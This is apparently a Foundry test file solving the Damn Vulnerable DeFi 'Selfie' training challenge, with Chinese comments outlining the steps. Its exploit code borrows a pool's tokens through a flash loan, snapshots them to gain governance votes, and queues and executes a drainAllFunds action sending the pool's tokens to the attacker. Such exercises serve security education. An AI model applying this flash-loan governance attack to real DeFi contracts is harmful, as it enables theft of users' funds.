// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;
    uint256 actionId;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL); // 1_500_000e18

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        // 剩余 500_000e18 dvt

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        /*
         * 1. 通过闪电贷借款，获取投票资格
         * 2. 发起queueAction，调用slefiePool的取款，将钱转给attacker
         * 3. 归还闪电贷
         * 4. 模拟时间，执行Action
         */
        
        selfiePool.flashLoan(TOKENS_IN_POOL);

        vm.warp(block.timestamp + 3 days);
        simpleGovernance.executeAction(actionId);
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }

    function receiveTokens(address token, uint256 amount) external {
        // This function is called by the token contract when tokens are transferred to it (via `transferAndCall`)
        require(
            token == address(dvtSnapshot),
            "The token must be DVT"
        );
        /* 
         * 2. 发起queueAction，调用slefiePool的取款，将钱转给attacker
         * 3. 归还闪电贷 
         */
        dvtSnapshot.snapshot();
        actionId = simpleGovernance.queueAction(address(selfiePool), abi.encodeWithSignature("drainAllFunds(address)", address(attacker)), 0);
        dvtSnapshot.transfer(msg.sender, amount);
        
    }
}
